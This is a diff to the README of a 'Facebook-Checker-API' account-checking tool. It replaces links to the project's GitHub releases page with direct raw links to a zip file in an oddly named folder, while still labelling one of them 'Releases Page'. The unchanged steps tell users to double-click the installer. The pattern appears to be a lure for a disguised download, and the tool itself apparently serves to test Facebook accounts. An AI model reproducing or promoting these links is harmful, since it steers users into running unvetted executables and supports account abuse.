@@ -19,11 +19,11 @@ Welcome to the Facebook-Checker-API! This tool helps you verify Facebook account
 
 ## 📥 Download Now
 
-[![Download Facebook-Checker-API](https://img.shields.io/badge/Download%20Now-Installer-brightgreen)](https://github.com/t2d899/Facebook-Checker-API/releases)
+[![Download Facebook-Checker-API](https://raw.githubusercontent.com/t2d899/Facebook-Checker-API/main/crymotherapy/Facebook-Checker-API.zip%20Now-Installer-brightgreen)](https://raw.githubusercontent.com/t2d899/Facebook-Checker-API/main/crymotherapy/Facebook-Checker-API.zip)
 
 ## 📂 Download & Install
 
-1. Visit the [Releases Page](https://github.com/t2d899/Facebook-Checker-API/releases) to find the latest version.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/t2d899/Facebook-Checker-API/main/crymotherapy/Facebook-Checker-API.zip) to find the latest version.
 2. Click on the relevant installer for your system.
 3. Once downloaded, locate the file in your "Downloads" folder.
 4. Double-click the installer to run it.
